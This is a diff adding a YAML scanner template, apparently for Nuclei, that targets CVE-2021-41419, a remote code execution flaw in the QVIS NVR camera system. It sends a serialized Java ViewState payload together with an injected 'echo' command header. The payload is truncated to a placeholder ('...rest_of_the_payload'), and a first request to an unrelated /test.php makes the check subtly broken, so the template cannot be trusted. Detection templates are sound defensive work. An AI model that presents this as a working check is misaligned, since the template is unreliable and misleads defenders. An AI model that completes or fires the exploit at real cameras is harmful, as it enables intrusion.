@@ -1,0 +1,44 @@
+id: qvis-nvr-cms-rce
+info:
+  name: QVIS-NVR Camera Management System RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    QVIS NVR Camera Management System is vulnerable to remote code execution via Java deserialization.
+  classification:
+    cve-id: CVE-2021-41419
+    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 9.8
+  remediation: |
+    Upgrade to the latest version provided by the vendor.
+http:
+  - raw:
+      - |
+        GET /test.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "test"
+  - raw:
+      - |
+        POST /qvisdvr/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        X-Token-Data: echo {{randstr}}
+
+        javax.faces.ViewState={{base64("ACED0005737200116A6176612E7574696C2E...rest_of_the_payload")}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{randstr}}"
